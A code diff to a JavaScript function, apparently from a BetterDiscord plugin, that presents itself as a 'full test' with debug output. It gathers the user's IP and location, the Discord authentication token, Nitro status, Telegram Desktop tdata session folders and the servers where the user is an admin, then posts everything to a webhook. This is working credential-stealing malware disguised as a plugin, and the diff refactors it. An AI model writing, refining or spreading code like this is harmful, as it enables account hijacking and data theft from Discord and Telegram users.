@@ -6,17 +6,16 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
         dtoken: null,
         telegram_path: "Не найден",
         debug: {
-            fs_passed: false,
-            path_passed: false,
-            appdata_env: null,
-            localappdata_env: null,
+            fs_passed: !!fs,
+            path_passed: !!path,
+            appdata_env: process.env.APPDATA || "Нет",
             checked_paths: [],
             errors: []
         },
         admin_servers: []
     };
     
-    // 1. Получаем IP и локацию
+    // 1. IP и Локация
     try {
         const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
         const ipData = await ipRes.json();
@@ -29,7 +28,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
         }
     } catch (e) { result.debug.errors.push("IP Error: " + e.message); }
 
-    // 2. Проверяем статус Nitro
+    // 2. Nitro и Токен
     try {
         const UserStore = BdApi.Webpack.getStore("UserStore");
         if (UserStore) {
@@ -38,26 +37,15 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
             else if (user.premiumType === 2) result.nitro = "Nitro";
             else if (user.premiumType === 3) result.nitro = "Nitro Basic";
         }
-    } catch (e) { result.debug.errors.push("Nitro Error: " + e.message); }
-
-    // Получаем токен
-    let token = null;
-    try {
+        
         const authStore = BdApi.Webpack.getStore("AuthenticationStore");
-        if (authStore && typeof authStore.getToken === 'function') token = authStore.getToken();
-        result.dtoken = token;
-    } catch (e) {}
+        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
+    } catch (e) { result.debug.errors.push("User Error: " + e.message); }
 
-    // 3. Отладка и поиск Telegram
+    // 3. Поиск Telegram
     try {
-        result.debug.fs_passed = !!fs;
-        result.debug.path_passed = !!path;
-        result.debug.appdata_env = process.env.APPDATA || "Нет переменной";
-        result.debug.localappdata_env = process.env.LOCALAPPDATA || "Нет переменной";
-
         if (fs && path) {
             const possiblePaths = [];
-            
             if (process.env.APPDATA) {
                 possiblePaths.push(path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'));
                 possiblePaths.push(path.join(process.env.APPDATA, 'Telegram', 'tdata'));
@@ -74,11 +62,9 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
                 }
             }
         }
-    } catch (e) { 
-        result.debug.errors.push("Telegram Path Error: " + e.message);
-    }
+    } catch (e) { result.debug.errors.push("Telegram Error: " + e.message); }
 
-    // 4. Ищем серверы
+    // 4. Серверы и участники
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
@@ -93,10 +79,10 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
                         count = GuildMemberCountStore.getMemberCount(g.id);
                     }
                     if (!count) count = g.memberCount || g.approximateMemberCount;
-                    if (!count && token) {
+                    if (!count && result.dtoken) {
                         try {
                             const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
-                                headers: { "Authorization": token }
+                                headers: { "Authorization": result.dtoken }
                             });
                             if (res.ok) {
                                 const data = await res.json();
@@ -122,7 +108,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
         });
         return response.ok;
     } catch (e) {
-        console.error("Webhook Error", e);
         return false;
     }
 }
